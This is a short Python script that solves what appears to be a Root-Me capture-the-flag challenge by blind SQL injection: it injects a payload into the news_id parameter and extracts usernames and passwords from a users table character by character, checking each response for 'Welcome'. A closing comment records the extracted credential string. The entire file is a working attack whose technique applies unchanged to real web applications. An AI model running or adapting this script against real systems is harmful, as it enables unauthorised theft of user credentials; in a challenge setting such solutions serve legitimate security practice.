import urllib2, sys, string

url = 'http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id='
sql = '1 or (select substr(group_concat(username, password),%d,1) from users)=(select char(%d))  -- -'

alphabet = [str(i) for i in list(string.ascii_lowercase+string.ascii_uppercase)+range(10)]
i = 39
while True:
	for j in alphabet:
		req = urllib2.urlopen(urllib2.Request(url+sql%(i,ord(j)))).read()
		sys.stdout.write(j)
		if 'Welcome' not in req:
			sys.stdout.write('\b')
		else:
			break
		if j==alphabet[-1]:
			quit(0)
	i += 1


#results = 'user1aTlkJYLjcbLmue3adminaFjRKx7j9duser2'